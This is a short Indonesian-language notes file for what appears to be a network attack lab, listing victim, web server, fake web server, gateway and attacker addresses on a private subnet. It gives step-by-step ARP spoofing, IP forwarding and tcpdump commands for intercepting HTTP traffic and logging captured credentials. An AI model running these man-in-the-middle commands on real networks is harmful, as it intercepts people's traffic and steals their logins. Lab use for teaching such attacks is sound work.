=== DATA HASIL SERANGAN ===

Stolen credentials akan tercatat di file:
- stolen_credentials.txt (dari tcpdump)
- ettercap.log (dari ettercap)

IP Penting (Network: 172.20.0.0/16):
- Korban: 172.20.0.10
- Web Asli: 172.20.0.20
- Web Palsu: 172.20.0.30
- Gateway: 172.20.0.254
- Penyerang: 172.20.0.100

Tools yang tersedia di Kali:
- arpspoof : ARP spoofing
- ettercap : MITM + DNS spoof
- tcpdump : Packet capture
- nmap : Network scanner
- python3 + scapy : Custom script

Cara menggunakan:
1. arpspoof -i eth0 -t 172.20.0.10 172.20.0.20
2. arpspoof -i eth0 -t 172.20.0.20 172.20.0.10
3. echo 1 > /proc/sys/net/ipv4/ip_forward
4. tcpdump -i eth0 -A port 80